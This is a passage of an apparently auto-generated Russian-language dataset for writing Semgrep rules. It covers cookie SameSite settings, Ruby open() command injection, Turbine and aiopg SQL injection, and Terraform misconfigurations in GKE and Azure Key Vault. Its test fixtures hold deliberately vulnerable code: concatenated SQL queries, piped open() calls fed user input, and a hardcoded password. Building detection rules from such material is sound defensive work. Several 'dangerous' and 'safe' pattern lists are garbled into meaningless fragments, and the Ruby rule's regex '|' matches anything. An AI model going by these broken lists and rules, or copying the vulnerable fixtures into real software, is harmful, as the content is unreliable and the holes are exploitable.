    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-1275: Sensitive Cookie with Improper SameSite Attribute\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: session-cookie-samesitenone.go\npackage main\n\nimport (\n    \"net/http\"\n    \"github.com/gorilla/sessions\"\n)\n\nvar store = sessions.NewCookieStore([]byte(\"\"))\n\nfunc setSessionWithSameSiteNone(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"session-name\")\n    // ruleid: session-cookie-samesitenone\n    session.Options = &sessions.Options{\n        Path:     \"/\",\n        MaxAge:   3600,\n        HttpOnly: true,\n        Secure:   true,\n        SameSite: http.SameSiteNoneMode,\n    }\n    session.Save(r, w)\n}\n\nfunc setSessionWithSameSiteStrict(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"session-name\")\n    // ok: session-cookie-samesitenone\n    session.Options = &sessions.Options{\n        Path:     \"/\",\n        MaxAge:   3600,\n        HttpOnly: true,\n        Secure:   true,\n        SameSite: http.SameSiteStrictMode,\n    }\n    session.Save(r, w)\n}\n\nfunc main() {\n    http.HandleFunc(\"/set-none\", setSessionWithSameSiteNone)\n    http.HandleFunc(\"/set-strict\", setSessionWithSameSiteStrict)\n    http.ListenAndServe(\":8080\", nil)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: session-cookie-samesitenone.go\nsession.Options = &sessions.Options{\n...\nSameSite: http.SameSiteNoneMode,\n...}\n• // Another file: session-goes-wrong.go\nsession.Options = &sessions.Options{\n...\nSameSite: http.SameSiteNoneMode,\n...}\n\nБезопасные паттерны:  \n• // Safe file: session-safe.go\nsession.Options = &sessions.Options{\n...\nSameSite: http.SameSiteLaxMode,\n...}\n• // Another safe file: session-protected.go\nsession.Options = &sessions.Options{\n...\nSameSite: http.SameSiteStrictMode,\n...}\n\nЛегенда аннотаций:\n- // ruleid:session-cookie-samesitenone: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:session-cookie-samesitenone: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: session-cookie-samesitenone\n  patterns:\n  - pattern-inside: |\n      &sessions.Options{\n        ...,\n        SameSite: http.SameSiteNoneMode,\n        ...,\n      }\n  - pattern: |\n      &sessions.Options{\n        ...,\n      }\n  message: Found SameSiteNoneMode setting in Gorilla session options. Consider setting\n    SameSite to Lax, Strict or Default for enhanced security.\n  metadata:\n    cwe:\n    - 'CWE-1275: Sensitive Cookie with Improper SameSite Attribute'\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    references:\n    - https://pkg.go.dev/github.com/gorilla/sessions#Options\n    category: security\n    technology:\n    - gorilla\n    confidence: MEDIUM\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n  fix-regex:\n    regex: (SameSite\\s*:\\s+)http.SameSiteNoneMode\n    replacement: \\1http.SameSiteDefaultMode\n  severity: WARNING\n  languages:\n  - go\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования опции SameSiteNoneMode в настройках cookie Gorilla Sessions. Паттерн ищет структуру &sessions.Options{...}, где присутствует поле SameSite со значением http.SameSiteNoneMode. Опасный пример включает явное указание этого значения, тогда как безопасный пример использует другое значение, такое как SameSiteLaxMode или SameSiteStrictMode.\n\n# Ключевые элементы:\n- ID: session-cookie-samesitenone\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "session-cookie-samesitenone",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: lazy-load-module\nОписание уязвимости: Lazy loading can complicate code bundling if care is not taken, also `require`s are run synchronously by Node.js. If they are called from within a function, it may block other requests from being handled at a more critical time. The best practice is to `require` modules at the beginning of each file, before and outside of any functions.\nCWE: \nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: lazy-load-module.js\n// ok: lazy-load-module\nconst fs = require('fs')\n\nfunction smth() {\n  // ruleid: lazy-load-module\n  const mod = require('module-name')\n  return mod();\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• const mod = require('module-name')\n• function foo() {\n  const mod = require('module-name');\n}\n• async function bar(){\n  const mod = require('module-name');\n}\n\nБезопасные паттерны:  \n• require('module-name')\n• const mod = require('module-name');\nfunction foo() { ... }\n• let mod = require('module-name');\n\nЛегенда аннотаций:\n- // ruleid:lazy-load-module: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:lazy-load-module: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: lazy-load-module\n    patterns:\n      - pattern: require(...)\n      - pattern-inside: |\n          function $NAME(...) {\n              ...\n          }\n    message: >-\n      Lazy loading can complicate code bundling if care is not taken, also `require`s\n      are run synchronously by Node.js.\n      If they are called from within a function, it may block other requests from being\n      handled at a more critical time.\n      The best practice is to `require` modules at the beginning of each file, before\n      and outside of any functions.\n    languages: [javascript, typescript]\n    severity: WARNING\n    metadata:\n      category: best-practice\n      technology:\n        - javascript\n      references:\n        - https://nodesecroadmap.fyi/chapter-2/dynamism.html\n        - https://github.com/goldbergyoni/nodebestpractices#-38-require-modules-first-not-inside-functions\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска синхронных вызовов функции require внутри функций. Тип анализа — поиск (search). Правило использует два шаблона: первый шаблон ищет функцию require с произвольными аргументами, а второй шаблон проверяет, находится ли эта функция внутри определения другой функции. Если оба условия выполняются одновременно, то это считается опасным примером, так как требует модуля внутри функции может заблокировать выполнение других запросов.\n\n# Ключевые элементы:\n- ID: lazy-load-module\n- Язык: javascript \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "lazy-load-module",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dangerous-open\nОписание уязвимости: Detected non-static command inside 'open'. Audit the input to 'open'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dangerous-open.rb\n# ok:dangerous-open\ncmd = open(\"|date\")\nprint cmd.gets\ncmd.close\n\nfilename = \"testfile\"\n# ok:dangerous-open\nopen(filename) do |f|\n  print f.gets\nend\n\n# ruleid:dangerous-open\ncmd = open(\"|%s\" % user_input)\nprint cmd.gets\ncmd.close\n\n# ruleid:dangerous-open\ncmd = open(Kernel::sprintf(\"|%s\", user_input))\nprint cmd.gets\ncmd.close  # Ограничиваем длину\n\nОпасные паттерны:\n• cmd = open(\\\n•  % user_input)\n• cmd = open(Kernel::sprintf(\\\n\nБезопасные паттерны:  \n• cmd = open(\\\n• )\n• filename = \\\n\nЛегенда аннотаций:\n- // ruleid:dangerous-open: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-open: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-open\n  patterns:\n  - pattern: |\n      open($CMD,...)\n  - pattern-not: |\n      open(\"...\",...)\n  - metavariable-regex:\n      metavariable: $CMD\n      regex: '|'\n  message: >-\n    Detected non-static command inside 'open'. Audit the input to 'open'.\n    If unverified user data can reach this call site, this is a code injection\n    vulnerability. A malicious actor can inject a malicious script to execute\n    arbitrary code.\n  metadata:\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - ruby\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  severity: WARNING\n  languages: [ruby]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных вызовов метода 'open' в Ruby, где аргумент команды содержит динамически формируемый пользовательский ввод. Паттерн ищет вызовы 'open', которые принимают переменную строку, содержащую символ трубы ('|'), указывающий на выполнение внешней команды. Исключением являются случаи, когда строка жестко закодирована и не зависит от пользовательского ввода.\n\n# Ключевые элементы:\n- ID: dangerous-open\n- Язык: ruby \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dangerous-open",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcp-gke-kubernetes-rbac-google-groups\nОписание уязвимости: Manage Kubernetes RBAC users with Google Groups for GKE\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-kubernetes-rbac-google-groups.tf\n# fail\n# ruleid: gcp-gke-kubernetes-rbac-google-groups\nresource \"google_container_cluster\" \"fail\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network    = var.network\n  subnetwork = var.subnetwork\n\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block       = var.ip_allocation_policy[\"cluster_ipv4_cidr_block\"]\n    cluster_secondary_range_name  = var.ip_allocation_policy[\"cluster_secondary_range_name\"]\n    services_ipv4_cidr_block      = var.ip_allocation_policy[\"services_ipv4_cidr_block\"]\n    services_secondary_range_name = var.ip_allocation_policy[\"services_secondary_range_name\"]\n  }\n}\n\n# ok: gcp-gke-kubernetes-rbac-google-groups\nresource \"google_container_cluster\" \"success\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network    = var.network\n  subnetwork = var.subnetwork\n\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block       = var.ip_allocation_policy[\"cluster_ipv4_cidr_block\"]\n    cluster_secondary_range_name  = var.ip_allocation_policy[\"cluster_secondary_range_name\"]\n    services_ipv4_cidr_block      = var.ip_allocation_policy[\"services_ipv4_cidr_block\"]\n    services_secondary_range_name = var.ip_allocation_policy[\"services_secondary_range_name\"]\n  }\n\n  authenticator_groups_config {\n    security_group = \"gke-security-groups@yourdomain.com\"\n  }\n\n  node_config {\n    workload_metadata_config {\n      node_metadata = \"GKE_METADATA_SERVER\"\n    }\n  }\n\n  release_channel {\n    channel = var.release_channel\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_container_cluster\" \"fail\" { ... }\n• resource \"google_container_cluster\" \"another-fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"google_container_cluster\" \"success\" { ... authenticator_groups_config { ... } ... }\n• resource \"google_container_cluster\" \"ok\" { ... authenticator_groups_config { ... } ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-kubernetes-rbac-google-groups: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-kubernetes-rbac-google-groups: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-kubernetes-rbac-google-groups\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_container_cluster\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"google_container_cluster\" \"...\" {\n      ...\n      authenticator_groups_config {\n        ...\n        security_group = \"...\"\n        ...\n      }\n      ...\n      }\n  message: >-\n    Manage Kubernetes RBAC users with Google Groups for GKE\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ресурса Google Container Cluster (kubernetes) без указания конфигурации authenticator_groups_config, которая определяет группу безопасности Google Groups. В случае отсутствия такой конфигурации, управление доступом к ресурсам Kubernetes может быть недостаточно гранулярным, что нарушает контроль доступа. Правило использует шаблон поиска ресурса и проверяет наличие или отсутствие блока authenticator_groups_config внутри шаблона ресурса.\n\n# Ключевые элементы:\n- ID: gcp-gke-kubernetes-rbac-google-groups\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-kubernetes-rbac-google-groups",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: turbine-sqli\nОписание уязвимости: Detected a formatted string in a SQL statement. This could lead to SQL injection if variables in the SQL statement are not properly sanitized. Use a prepared statements (java.sql.PreparedStatement) instead. You can obtain a PreparedStatement using 'connection.prepareStatement'.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: turbine-sqli.java\npackage testcode.sqli.turbine;\n\nimport org.apache.turbine.om.peer.BasePeer;\nimport org.apache.turbine.om.security.peer.GroupPeer;\n\npublic class TurbineSql {\n\n    public void injection111(BasePeer peer1, String injection) {\n        // ruleid: turbine-sqli\n        peer1.executeQuery(injection);\n        // ruleid: turbine-sqli\n        peer1.executeQuery(injection,false,null);\n        // ruleid: turbine-sqli\n        peer1.executeQuery(injection,0,0,false,null);\n        // ruleid: turbine-sqli\n        peer1.executeQuery(injection,0,0,\"\",false);\n        // ruleid: turbine-sqli\n        peer1.executeQuery(injection,\"\");\n        // ruleid: turbine-sqli\n        peer1.executeQuery(injection,\"\",false);\n    }\n\n    public void injection2(GroupPeer peer2, String injection) {\n        // ruleid: turbine-sqli\n        peer2.executeQuery(injection);\n        // ruleid: turbine-sqli\n        peer2.executeQuery(injection,false,null);\n        // ruleid: turbine-sqli\n        peer2.executeQuery(injection,0,0,false,null);\n        // ruleid: turbine-sqli\n        peer2.executeQuery(injection,0,0,\"\",false);\n        // ruleid: turbine-sqli\n        peer2.executeQuery(injection,\"\");\n        // ruleid: turbine-sqli\n        peer2.executeQuery(injection,\"\",false);\n    }\n\n    public void injection3(String injection) {\n        // ruleid: turbine-sqli\n        BasePeer.executeQuery(injection);\n        // ruleid: turbine-sqli\n        BasePeer.executeQuery(injection,false,null);\n        // ruleid: turbine-sqli\n        BasePeer.executeQuery(injection,0,0,false,null);\n        // ruleid: turbine-sqli\n        BasePeer.executeQuery(injection,0,0,\"\",false);\n        // ruleid: turbine-sqli\n        BasePeer.executeQuery(injection,\"\");\n        // ruleid: turbine-sqli\n        BasePeer.executeQuery(injection,\"\",false);\n    }\n\n    public void injection4(String injection) {\n        // ruleid: turbine-sqli\n        GroupPeer.executeQuery(injection);\n        // ruleid: turbine-sqli\n        GroupPe  # Ограничиваем длину\n\nОпасные паттерны:\n• peer1.executeQuery(injection);\n• peer2.executeQuery(injection);\n• BasePeer.executeQuery(injection);\n\nБезопасные паттерны:  \n• String constantValue = \"SELECT * FROM test\"; peer0.executeQuery(constantValue);\n• peer0.executeQuery(\"SELECT * FROM test\",false,null);\n• peer0.executeQuery(\"SELECT * FROM test\",0,0,false,null);\n\nЛегенда аннотаций:\n- // ruleid:turbine-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:turbine-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: turbine-sqli\n  pattern-either:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern-inside: |\n              String $SQL = $X + $Y;\n              ...\n          - pattern-inside: |\n              String $SQL = String.format(...);\n              ...\n          - pattern-inside: |\n              $VAL $FUNC(...,String $SQL,...) {\n                ...\n              }\n        - pattern-not-inside: |\n            String $SQL = \"...\" + \"...\";\n            ...\n        - pattern: $PEER.executeQuery($SQL,...)\n      - pattern: |\n          $PEER.executeQuery(String.format(...),...)\n      - pattern: |\n          $PEER.executeQuery($X + $Y,...)\n    - pattern-not: |\n        $PEER.executeQuery(\"...\" + \"...\",...)\n    - metavariable-regex:\n        metavariable: $PEER\n        regex: (BasePeer|GroupPeer)\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern-inside: |\n              String $SQL = $X + $Y;\n              ...\n          - pattern-inside: |\n              String $SQL = String.format(...);\n              ...\n          - pattern-inside: |\n              $VAL $FUNC(...,String $SQL,...) {\n                ...\n              }\n        - pattern-not-inside: |\n            String $SQL = \"...\" + \"...\";\n            ...\n        - pattern: $P.executeQuery($SQL,...)\n      - pattern: |\n          $P.executeQuery(String.format(...),...)\n      - pattern: |\n          $P.executeQuery($X + $Y,...)\n    - pattern-either:\n      - pattern-inside: |\n          BasePeer $P = ...;\n          ...\n      - pattern-inside: |\n          GroupPeer $P = ...;\n          ...\n      - pattern-inside: |\n          $VAL $FUNC(...,GroupPeer $P,...) {\n            ...\n          }\n      - pattern-inside: |\n          $VAL $FUNC(...,BasePeer $P,...) {\n            ...\n          }\n    - pattern-not: |\n        $P.executeQuery(\"...\" + \"...\",...)\n  message: >-\n    Detected a formatted string in a SQL statement. This could lead to SQL\n    injection if variables in the SQL statement are not properly sanitized.\n    Use a prepared statements (java.sql.PreparedStatement) instead. You\n    can obtain a PreparedStatement using 'connection.prepareStatement'.\n  languages: [java]\n  severity: WARNING\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    category: security\n    technology:\n    - turbine\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей SQL-инъекции, вызванных использованием незащищенных строковых конкатенаций или форматированных строк в SQL-запросах, передаваемых напрямую в методы executeQuery() объектов BasePeer и GroupPeer. Правило использует шаблон поиска, включающий проверку наличия переменной, содержащей строку, которая формируется путем конкатенации или форматирования, а затем передается методам executeQuery(). Исключаются случаи, когда строка является жестко закодированной литеральной строкой. Также проверяется тип объекта-предка, который вызывает метод executeQuery(), чтобы убедиться, что он относится к классу BasePeer или GroupPeer.\n\n# Ключевые элементы:\n- ID: turbine-sqli\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "turbine-sqli",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: keyvault-purge-enabled\nОписание уязвимости: Key vault should have purge protection enabled\nCWE: CWE-693: Protection Mechanism Failure\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-693: Protection Mechanism Failure\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: keyvault-purge-enabled.tf\nresource \"azurerm_key_vault\" \"good_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.good_example.location\n    enabled_for_disk_encryption = true\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = true\n}\n\n# ruleid: keyvault-purge-enabled\nresource \"azurerm_key_vault\" \"bad_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.bad_example.location\n    enabled_for_disk_encryption = true\n    purge_protection_enabled    = false\n}\n\n# ruleid: keyvault-purge-enabled\nresource \"azurerm_key_vault\" \"bad_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.bad_example.location\n    enabled_for_disk_encryption = true\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_key_vault\" \"bad_example\" { ... purge_protection_enabled = false ... }\n• resource \"azurerm_key_vault\" \"another_bad_example\" { ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_key_vault\" \"good_example\" { ... purge_protection_enabled = true ... }\n\nЛегенда аннотаций:\n- // ruleid:keyvault-purge-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:keyvault-purge-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: keyvault-purge-enabled\n  message: >-\n    Key vault should have purge protection enabled\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_key_vault\" \"...\" {\n      ...\n       purge_protection_enabled = true\n      ...\n      }\n  - pattern-either:\n    - pattern-inside: |\n        resource \"azurerm_key_vault\" \"...\" {\n        ...\n        }\n    - pattern-inside: |\n        resource \"azurerm_key_vault\" \"...\" {\n        ...\n          purge_protection_enabled = false\n        ...\n        }\n  metadata:\n    cwe:\n    - 'CWE-693: Protection Mechanism Failure'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled\n    - https://docs.microsoft.com/en-us/azure/key-vault/general/soft-delete-overview#purge-protection\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Key Vault в конфигурациях Terraform, где атрибут 'purge_protection_enabled' не установлен или имеет значение 'false'. Анализ выполняется путем проверки наличия ресурса типа 'azurerm_key_vault', а затем исключения случаев, когда внутри этого ресурса явно указан атрибут 'purge_protection_enabled = true'. Оставшиеся случаи считаются небезопасными и помечаются как потенциальные уязвимости.\n\n# Ключевые элементы:\n- ID: keyvault-purge-enabled\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "keyvault-purge-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: aiopg-sqli\nОписание уязвимости: Detected string concatenation with a non-literal variable in an aiopg Python SQL statement. This could lead to SQL injection if the variable is user-controlled and not properly sanitized. In order to prevent SQL injection, use parameterized queries instead. You can create parameterized queries like so: 'cur.execute(\"SELECT %s FROM table\", (user_value,))'.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aiopg-sqli.py\nimport asyncio\nimport asyncpg\n\ndef bad1():\n    conn = await aiopg.connect(database='aiopg',\n                               user='aiopg',\n                               password='secret',\n                               host='127.0.0.1')\n    cur = await conn.cursor()\n    query = \"SELECT name FROM users WHERE age=\" + req.FormValue(\"age\")\n    # ruleid: aiopg-sqli\n    await cur.execute(query)\n\nasync def bad2():\n    pool = await aiopg.create_pool(dsn)\n\n    with (await pool.cursor()) as cur:\n        sql_query = 'SELECT * FROM {}'.format(user_input)\n        # ruleid: aiopg-sqli\n        await cur.execute(sql_query)\n        ret = await cur.fetchone()\n        assert ret == (1,), ret\n\nasync def bad3():\n    pool = await aiopg.create_pool(dsn)\n    async with pool.acquire() as conn:\n        sql_query = 'SELECT * FROM %s'%(user_input)\n        async with conn.cursor() as cur:\n            # ruleid: aiopg-sqli\n            await cur.execute(sql_query)\n            ret = []\n            async for row in cur:\n                ret.append(row)\n\ndef bad4(user_input):\n    pool = await aiopg.create_pool(dsn)\n    async with pool as conn:\n        cur = await conn.cursor()\n        sql_query = f'SELECT * FROM {user_input}'\n        # ruleid: aiopg-sqli\n        await cur.execute(sql_query)\n\ndef bad5():\n    pool = await aiopg.create_pool(dsn)\n    async with pool.cursor() as cur:\n        # ruleid: aiopg-sqli\n        await cur.execute(\"SELECT name FROM users WHERE age=\" + req.FormValue(\"age\"))\n\ndef bad6(user_input):\n    pool = await aiopg.create_pool(dsn)\n    async with pool.cursor() as cur:\n        # ruleid: aiopg-sqli\n        await cur.execute('SELECT * FROM {}'.format(user_input))\n\nasync def bad7(user_input):\n    conn = await aiopg.connect(database='aiopg',\n                               user='aiopg',\n                               password='secret',\n                               host='127.0.0.1')\n    cur = await conn.cursor()\n    # ruleid: aiopg-sqli\n    cur.execute('SELECT *   # Ограничиваем длину\n\nОпасные паттерны:\n• query = \\\n•  + req.FormValue(\\\n• )\n\nБезопасные паттерны:  \n• cur.execute(\\\n• , (3,))\n• query = \\\n\nЛегенда аннотаций:\n- // ruleid:aiopg-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aiopg-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aiopg-sqli\n  languages:\n  - python\n  message: >-\n    Detected string concatenation with a non-literal variable in an aiopg\n    Python SQL statement. This could lead to SQL injection if the variable is user-controlled\n    and not properly sanitized. In order to prevent SQL injection,\n    use parameterized queries instead.\n    You can create parameterized queries like so:\n    'cur.execute(\"SELECT %s FROM table\", (user_value,))'.\n  metadata:\n    references:\n    - https://github.com/aio-libs/aiopg\n    category: security\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    technology:\n    - aiopg\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: $CUR.$METHOD(...,$QUERY,...)\n      - pattern-either:\n        - pattern-inside: |\n            $QUERY = $X + $Y\n            ...\n        - pattern-inside: |\n            $QUERY += $X\n            ...\n        - pattern-inside: |\n            $QUERY = '...'.format(...)\n            ...\n        - pattern-inside: |\n            $QUERY = '...' % (...)\n            ...\n        - pattern-inside: |\n            $QUERY = f'...{$USERINPUT}...'\n            ...\n      - pattern-not-inside: |\n          $QUERY += \"...\"\n          ...\n      - pattern-not-inside: |\n          $QUERY = \"...\" + \"...\"\n          ...\n      - pattern-not-inside: |\n          $QUERY = '...'.format()\n          ...\n      - pattern-not-inside: |\n          $QUERY = '...' % ()\n          ...\n    - pattern: $CUR.$METHOD(..., $X + $Y, ...)\n    - pattern: $CUR.$METHOD(..., '...'.format(...), ...)\n    - pattern: $CUR.$METHOD(..., '...' % (...), ...)\n    - pattern: $CUR.$METHOD(..., f'...{$USERINPUT}...', ...)\n  - pattern-either:\n    - pattern-inside: |\n        $CONN = await aiopg.connect(...)\n        ...\n        $CUR = await $CONN.cursor(...)\n        ...\n    - pattern-inside: |\n        $POOL = await aiopg.create_pool(...)\n        ...\n        async with $POOL.acquire(...) as $CONN:\n          ...\n          async with $CONN.cursor(...) as $CUR:\n            ...\n    - pattern-inside: |\n        $POOL = await aiopg.create_pool(...)\n        ...\n        with (await $POOL.cursor(...)) as $CUR:\n          ...\n    - pattern-inside: |\n        $POOL = await aiopg.create_pool(...)\n        ...\n        async with $POOL as $CONN:\n          ...\n          $CUR = await $CONN.cursor(...)\n          ...\n    - pattern-inside: |\n        $POOL = await aiopg.create_pool(...)\n        ...\n        async with $POOL.cursor(...) as $CUR:\n          ...\n  - pattern-not: $CUR.$METHOD(..., \"...\" + \"...\", ...)\n  - pattern-not: $CUR.$METHOD(..., '...'.format(), ...)\n  - pattern-not: $CUR.$METHOD(..., '...'%(), ...)\n  - metavariable-regex:\n      metavariable: $METHOD\n      regex: ^(execute)$\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных SQL запросов, созданных с использованием библиотеки aiopg в Python. Оно ищет случаи конкатенации строк с переменными, которые могут быть контролируемыми пользователем, что потенциально может привести к SQL-инъекции. Правило использует шаблон сопоставления, который проверяет методы класса Cursor (например, execute) и наличие оператора конкатенации или форматирования строк, где одна из частей является переменной. Исключения сделаны для случаев, когда строка полностью формируется литералами или не содержит пользовательский ввод.\n\n# Ключевые элементы:\n- ID: aiopg-sqli\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aiopg-sqli",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения avoid-unsafe-ruamel\nОписание уязвимости: Avoid using unsafe `ruamel.yaml.YAML()`. `ruamel.yaml.YAML` can create arbitrary Python objects. A malicious actor could exploit this to run arbitrary code. Use `YAML(typ='rt')` or `YAML(typ='safe')` instead.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: python",
